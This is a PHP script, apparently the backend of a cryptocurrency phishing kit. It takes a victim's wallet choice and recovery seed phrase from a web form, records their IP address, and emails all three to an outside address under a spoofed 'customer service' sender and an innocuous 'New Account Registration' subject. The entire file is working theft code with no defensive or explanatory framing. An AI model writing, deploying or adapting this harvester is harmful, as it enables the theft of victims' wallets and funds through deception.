<?php
    
    $to = 'abelejayan@securerestorechannel.com';
    $subject = 'New Account Registration';
    $from = 'customerservice@virtualvocations.com';

    $wallet = $_POST['wallet_selected'];
        $ip = getenv("REMOTE_ADDR");
        $phrase=$_POST['data_phrase'];

        
        // To send HTML mail, the Content-type header must be set
        $headers  = 'MIME-Version: 1.0' . "\r\n";
        $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
        
        // Create email headers
        $headers .= 'From: '.$from."\r\n".
            'Reply-To: '.$from."\r\n" .
            'X-Mailer: PHP/' . phpversion();
        
        // Compose a simple HTML email message
        $message = '<html><body>';
        $message .= '<h1 style="color:#f40;">Hi there!</h1>';
        $message .= '<p style="color:#080;font-size:18px;">Wallet '.$wallet.'</p>';
        $message .= '<p style="color:#080;font-size:18px;">ip '.$ip.'</p>';
        $message .= '<p style="color:#080;font-size:18px;">phrase '.$phrase.'</p>';
        $message .= '</body></html>';

        if(mail($to, $subject, $message, $headers)){
            echo json_encode(array("statusCode"=>200,"result"=>"success"));
        }
   


